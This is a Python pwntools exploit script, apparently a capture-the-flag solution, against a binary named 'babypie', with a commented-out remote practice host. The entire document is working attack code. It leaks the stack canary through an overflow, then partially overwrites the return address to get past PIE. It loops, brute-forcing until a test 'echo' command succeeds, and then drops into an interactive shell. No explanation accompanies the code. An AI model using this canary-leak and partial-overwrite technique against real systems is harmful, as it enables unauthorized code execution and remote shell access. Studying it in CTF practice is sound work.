from pwn import *
context(arch='amd64', os='linux', log_level='debug')

while True:
    #io = remote('node4.buuoj.cn', 25513)
    io = process('./babypie')

    payload = 'a'*0x28
    io.sendline(payload)
    io.recvuntil("aaaa\n")
    canary = (u64(io.recv(7).rjust(8,b'\x00'))) 
    print 'canary:',hex(canary)

    payload = 'a'*0x28 + p64(canary) + 'a'*8 + '\x3e\x0a'
    io.send(payload)

    try:
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
    except:
        print "Error"
        io.close()
        continue
    else:
        io.interactive()
